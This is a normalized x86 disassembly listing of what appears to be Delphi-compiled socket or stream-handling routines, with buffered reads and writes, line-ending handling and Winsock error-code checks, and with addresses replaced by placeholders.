mov edx [ eax ]
call [ edx + 0x3c ]
mov dl 0x4
mov eax ebx
call sub_4755ec
pop ebx
retn
lea eax [ ebx + 0x7c ]
call sub_40d564
mov [ ebx + 0x70 ] 0x0
sub_478d44
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_479f84
push edi
mov ecx esi
mov eax [ ebx + 0x80 ]
mov dx [ eax + 0xc ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x50 ]
pop edi
pop esi
pop ebx
retn
sub_478d6c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_478dbd
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x80 ]
mov eax [ eax + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax esi
call sub_40badc
call sub_403a64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478dc4
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
sub_478dcc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_478e22
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov esi [ ebx + 0x80 ]
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ esi + 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4714c0
call sub_403a64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478e29
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
sub_478e30
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
test esi esi
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test edi edi
je r-xdata
jmp r-xdata
mov eax [ ebx + 0x74 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jg r-xdata
cmp eax [ esp ]
pop edx
pop eax
ja r-xdata
push 0x1
or ecx 0xffffffff
mov dl 0x1
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x6c ]
mov cl 0x1
mov dl 0x1
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x48 ]
mov eax [ ebx + 0x74 ]
call sub_47a304
mov edx edi
mov ecx esi
call sub_4028e8
mov edx esi
mov eax [ ebx + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
sub_478e9c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_479134
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0xffffffff
jne r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
xor ecx ecx
mov dl [ ebp - 0x1 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x48 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov eax [ ebx + 0x9c ]
test eax eax
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor esi esi
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8 ] 0xfffffffe
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47913b
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_4040d0
lea eax [ ebp - 0x10 ]
call sub_4040ac
retn
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov ecx [ ebx + 0xa4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0xc ] 0xffffffff
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
xor esi esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
cmp [ ebx + 0x7c ] 0x0
je r-xdata
test esi esi
sete al
mov [ ebx + 0x69 ] al
test al al
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
mov eax [ ebx + 0xa0 ]
cdq
push edx
push eax
mov eax ecx
call sub_41aeec
mov esi [ ebx + 0xa4 ]
mov eax esi
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ esi + 0x4 ]
mov eax [ ebx + 0x7c ]
mov esi [ eax ]
call [ esi + 0x54 ]
mov esi eax
jmp r-xdata
xor ecx ecx
mov dl [ ebp - 0x1 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x48 ]
mov [ ebp - 0xc ] esi
jmp r-xdata
push 0x1
mov [ ebp - 0x18 ] 0x274a
mov [ ebp - 0x14 ] 0x2745
lea ecx [ ebp - 0x18 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_472c68
test al al
je r-xdata
test esi esi
jne r-xdata
test esi esi
jle r-xdata
xor esi esi
cmp [ ebx + 0x7c ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov eax esi
cdq
push edx
push eax
mov eax [ ebx + 0xa4 ]
call sub_41aeec
cmp [ ebx + 0x78 ] 0x0
je r-xdata
mov eax [ ebx + 0x74 ]
mov edx [ eax ]
call [ edx ]
cmp edx 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x5c ]
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x7c ]
mov ecx [ eax ]
call [ ecx + 0x50 ]
test al al
je r-xdata
jmp r-xdata
cmp [ ebx + 0x68 ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ ebx + 0xa4 ]
call sub_41ae88
mov edx [ ebx + 0xa4 ]
mov eax [ ebx + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov eax [ ebx + 0xa4 ]
mov edx [ eax ]
call [ edx ]
mov esi eax
cmp eax 0x0
jne r-xdata
mov cx 0x2
xor edx edx
mov eax [ ebx + 0x74 ]
mov edi [ eax ]
call [ edi + 0x14 ]
mov edi [ ebx + 0xa4 ]
mov eax edi
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ edi + 0x4 ]
mov eax [ ebx + 0x74 ]
call sub_41b0cc
mov eax [ ebx + 0xa4 ]
mov edx [ eax ]
call [ edx ]
mov edx eax
test edx edx
jle r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_472d1c
mov eax 0x1
mov ecx [ ebx + 0xa4 ]
mov ecx [ ecx + 0x4 ]
mov cl [ ecx + eax ]
and cl 0x7f
push ecx
mov ecx [ ebx + 0xa4 ]
mov ecx [ ecx + 0x4 ]
lea edi [ ecx + eax ]
pop ecx
mov [ edi ] cl
inc eax
dec edx
jne r-xdata
sub_479148
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_40455c
xor eax eax
push ebp
push sub_479366
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_40436c
test eax eax
jne r-xdata
mov eax [ esi + 0x88 ]
mov [ ebp + 0xc ] eax
mov [ esi + 0x98 ] 0x0
mov [ esi + 0x99 ] 0x0
xor ebx ebx
xor eax eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404144
mov eax ebx
dec eax
cmp eax [ ebp + 0xc ]
jle r-xdata
mov eax [ esi + 0x74 ]
call sub_47a304
mov edx eax
add edx [ ebp - 0xc ]
mov ecx edi
sub ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_474ae4
mov ebx eax
test ebx ebx
jle r-xdata
test ebx ebx
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov [ ebp - 0xc ] edi
add ebx [ ebp - 0xc ]
test ebx ebx
jle r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0xc ]
jle r-xdata
cmp [ esi + 0x84 ] 0x0
jne r-xdata
mov eax [ esi + 0x74 ]
mov edx [ eax ]
call [ edx ]
mov edi eax
test edi edi
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_40436c
mov edx eax
add edx ebx
dec edx
mov ecx [ ebp + 0x8 ]
mov eax [ esi + 0x74 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
call sub_40436c
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_40436c
sub ebx eax
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4044b8
jne r-xdata
mov cl 0x1
mov dl 0x1
mov eax esi
mov edi [ eax ]
call [ edi + 0x48 ]
cmp [ ebp - 0x8 ] 0xffffffff
sete al
push eax
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax esi
mov edi [ eax ]
call [ edi + 0x6c ]
test eax eax
sete al
mov [ esi + 0x99 ] al
cmp [ esi + 0x99 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov [ esi + 0x98 ] 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov eax [ esi + 0x74 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx ebx
call sub_4046f8
test ebx ebx
jle r-xdata
mov eax [ ebp + 0x8 ]
call sub_4040ac
jmp r-xdata
cmp [ esi + 0x84 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47936d
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_4040d0
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax + ebx - 0x1 ] 0xd
jne r-xdata
mov [ esi + 0x98 ] 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov eax [ esi + 0x74 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
jmp r-xdata
mov edx ebx
dec edx
mov eax [ ebp + 0x8 ]
call sub_4046f8
jmp r-xdata
sub_479384
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4793fa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4040ac
xor esi esi
jmp r-xdata
mov eax [ ebx ]
call sub_40436c
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479401
lea eax [ ebp - 0xc ]
call sub_4040ac
retn
cmp esi [ ebp - 0x8 ]
jl r-xdata
inc esi
push 0xffffffff
lea eax [ ebp - 0xc ]
push eax
or ecx 0xffffffff
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x70 ]
mov eax [ ebp - 0xc ]
mov edx ebx
call sub_408120
sub_479428
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x7c ]
mov edx esi
mov ecx [ ebp + 0x8 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x60 ]
pop esi
pop ebx
pop ebp
retn 0x4
sub_47944c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_42168c
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x78 ]
jne r-xdata
cmp esi [ edi + 0x7c ]
jne r-xdata
xor eax eax
mov [ edi + 0x78 ] eax
xor eax eax
mov [ edi + 0x7c ] eax
sub_479494
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x7c ] 0x0
je r-xdata
test esi esi
jne r-xdata
cmp [ ebx + 0x70 ] 0x0
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
xor eax eax
mov [ ebx + 0xac ] eax
jmp r-xdata
lea eax [ ebx + 0x7c ]
call sub_40d564
mov [ ebx + 0x70 ] 0x0
mov eax esi
mov [ ebx + 0x7c ] eax
test eax eax
je r-xdata
mov [ ebx + 0xac ] esi
pop esi
pop ebx
retn
mov edx ebx
call sub_421440
sub_4794ec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_40436c
test eax eax
jle r-xdata
pop esi
pop ebx
retn
push 0x0
mov edx esi
mov ecx eax
mov eax ebx
call sub_479510
sub_479510
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_479710
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479717
lea eax [ ebp - 0x1c ]
call sub_4040ac
retn
test esi esi
je r-xdata
mov cl 0x1
mov dl 0x1
mov eax ebx
mov edi [ eax ]
call [ edi + 0x48 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
mov eax [ ebx + 0xb0 ]
test eax eax
sete dl
or dl [ ebp + 0x8 ]
je r-xdata
mov edx esi
mov ecx [ ebp - 0x4 ]
call sub_41b0cc
mov eax [ ebx + 0xb0 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov esi [ ebx + 0xb4 ]
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
push 0x0
push 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_479d78
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_479691
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_41b0cc
cmp [ ebx + 0x78 ] 0x0
je r-xdata
pop edx
pop eax
jg r-xdata
cmp eax [ esp ]
pop edx
pop eax
ja r-xdata
mov [ ebp - 0xc ] 0x1
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_41ae88
mov eax [ ebx + 0x78 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x4 ] eax
test esi esi
jle r-xdata
jmp r-xdata
mov ecx esi
mov dl 0x1
mov eax ebx
mov edi [ eax ]
call [ edi + 0x34 ]
add [ ebp - 0xc ] esi
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x4 ]
jle r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x5c ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x6c ]
mov edx eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_472d1c
mov edx esi
mov eax ebx
call sub_479ac8
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
sub ecx [ ebp - 0xc ]
inc ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0xc ]
lea edx [ eax + edx - 0x1 ]
mov eax [ ebx + 0x7c ]
mov esi [ eax ]
call [ esi + 0x58 ]
mov esi eax
xor ecx ecx
xor edx edx
mov eax [ r-xdata ]
call sub_47511c
test esi esi
sete al
mov [ ebx + 0x69 ] al
xor ecx ecx
mov dl 0x1
mov eax ebx
mov edi [ eax ]
call [ edi + 0x48 ]
push 0x2
mov [ ebp - 0x18 ] 0x274a
mov [ ebp - 0x14 ] 0x2745
mov [ ebp - 0x10 ] 0x2746
lea ecx [ ebp - 0x18 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_472c68
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x8 ]
call sub_40d564
retn
sub_479720
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ebx
mov ebx ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_479842
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_408790
test al al
je r-xdata
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405e08
mov eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0xb
lea edx [ ebp - 0x18 ]
xor ecx ecx
pop eax
call sub_408fe4
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x20
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b380
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4797e5
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
mov cl 0x1
mov edx [ ebp - 0x8 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x80 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4032b0
retn
cmp [ edi + 0x78 ] 0x0
jne r-xdata
test bl bl
je r-xdata
cmp [ edi + 0xac ] 0x0
je r-xdata
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov eax [ edi + 0xac ]
mov eax [ eax + 0x68 ]
mov eax [ eax + 0xc ]
mov edx esi
call ebx
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479849
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_4040d0
retn
sub_479854
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
test cl cl
je r-xdata
push 0x0
lea edx [ esp + 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_479510
pop edx
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov [ esp ] eax
sub_479888
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4798d0
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov ecx r-xdata
mov edx esi
call sub_4043b8
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x78 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4798d7
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
sub_4798df
inc [ edx ]
add [ eax ] al
add [ 0x5500000a ] cl
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x5 ] cl
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_479a5e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x5 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
push 0x0
push 0x0
mov eax esi
call sub_41ae88
mov eax esi
call sub_41ae68
add ebx eax
mov [ ebp - 0x10 ] ebx
mov eax esi
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
xor eax eax
push ebp
push sub_479a41
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_479a22
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xa8 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov cl 0x1
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_479854
mov eax esi
call sub_41ae68
mov ebx [ ebp - 0x10 ]
sub ebx eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479a29
lea eax [ ebp - 0xc ]
call sub_40d564
retn
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov ecx ebx
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx eax
test ebx ebx
jne r-xdata
push 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov ecx ebx
mov eax [ ebp - 0x4 ]
call sub_479510
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
mov eax esi
call sub_41ae68
push eax
mov eax [ ebp - 0x10 ]
pop edx
sub eax edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xa8 ]
call sub_474704
mov ebx eax
test ebx ebx
je r-xdata
sub_479a70
push ebx
push ecx
cmp cx 0xffff
jne r-xdata
push 0x0
mov [ esp + 0x4 ] cx
lea ecx [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x74 ]
pop edx
pop ebx
retn
push 0xffffffff
lea ecx [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x74 ]
pop edx
pop ebx
retn
sub_479a9c
push ebx
mov ebx eax
cmp [ ebx + 0x7c ] 0x0
je r-xdata
pop ebx
retn
mov [ ebx + 0x69 ] 0x1
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebx + 0x78 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x7c ]
mov edx [ eax ]
call [ edx + 0x40 ]
mov edx [ eax ]
call [ edx + 0x44 ]
sub_479ac8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0xb0 ]
mov edx [ eax ]
call [ edx ]
cmp edx 0x0
jne r-xdata
jle r-xdata
cmp eax 0x0
jbe r-xdata
pop esi
pop ebx
retn
cmp esi 0xffffffff
je r-xdata
jmp r-xdata
push 0x1
mov esi [ ebx + 0xb0 ]
mov eax esi
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ esi + 0x4 ]
mov eax ebx
call sub_479510
mov eax ebx
call sub_479b54
jmp r-xdata
mov eax [ ebx + 0xb0 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jle r-xdata
cmp eax [ esp ]
pop edx
pop eax
jbe r-xdata
push 0x1
mov eax [ ebx + 0xb0 ]
mov edx [ eax + 0x4 ]
mov ecx esi
mov eax ebx
call sub_479510
mov edx esi
mov eax [ ebx + 0xb0 ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
sub_479b60
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x9 ] cl
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_479d4a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
mov eax esi
call sub_4040ac
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x88 ]
mov [ ebp + 0xc ] eax
cmp bl 0xa
jne r-xdata
xor eax eax
mov al bl
add eax 0xfffffff8
cmp eax 0x13
ja r-xdata
mov eax [ ebp - 0x4 ]
call sub_47a1ec
mov ebx eax
mov eax [ esi ]
call sub_40436c
mov edi eax
cmp edi [ ebp + 0xc ]
jg r-xdata
mov eax [ esi ]
call sub_40436c
mov edi eax
jmp r-xdata
lea eax [ ebp - 0x1c ]
mov edx ebx
call sub_404294
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_404374
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov al [ eax + lookup_table_479be2 ]
jmp [ eax * 4 + jump_table_479bf6 ]
test edi edi
jle r-xdata
mov eax [ ebp - 0x8 ]
call sub_40436c
test eax eax
jne r-xdata
test edi edi
jle r-xdata
cmp [ ebp + 0x10 ] 0x0
jle r-xdata
mov eax esi
mov edx edi
call sub_4046f8
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479d51
lea eax [ ebp - 0x20 ]
mov edx 0x5
call sub_4040d0
retn
mov eax [ esi ]
mov al [ eax + edi - 0x1 ]
sub al 0xa
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x78 ]
lea eax [ ebp - 0x20 ]
mov edx ebx
call sub_404294
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x78 ]
jmp r-xdata
mov edx edi
dec edx
mov eax esi
call sub_4046f8
cmp [ ebp - 0x9 ] 0x0
je r-xdata
lea eax [ ebp - 0x14 ]
mov edx ebx
call sub_404294
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_404374
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov eax edi
cdq
idiv [ ebp + 0x10 ]
mov eax [ ebp + 0x10 ]
sub eax edx
mov edi eax
lea ecx [ ebp - 0x10 ]
mov edx edi
mov al 0x20
call sub_40475c
mov eax esi
mov edx [ ebp - 0x10 ]
call sub_404374
cmp [ ebp - 0x9 ] 0x0
je r-xdata
dec edi
sub al 0x3
je r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x78 ]
jmp r-xdata
lea eax [ ebp - 0x18 ]
mov edx ebx
call sub_404294
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x78 ]
jmp r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x78 ]
jmp r-xdata
sub_479d78
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403280
mov eax [ ebp + 0x8 ]
mov [ esi + 0x18 ] eax
mov eax [ ebp + 0xc ]
mov [ esi + 0x1c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_479dc0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_479e46
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jle r-xdata
cmp eax [ esp ]
pop edx
pop eax
jbe r-xdata
mov eax edi
mov ecx esi
mov edx [ ebx + 0x4 ]
call sub_40419c
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479e4d
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
jmp r-xdata
sub_479e54
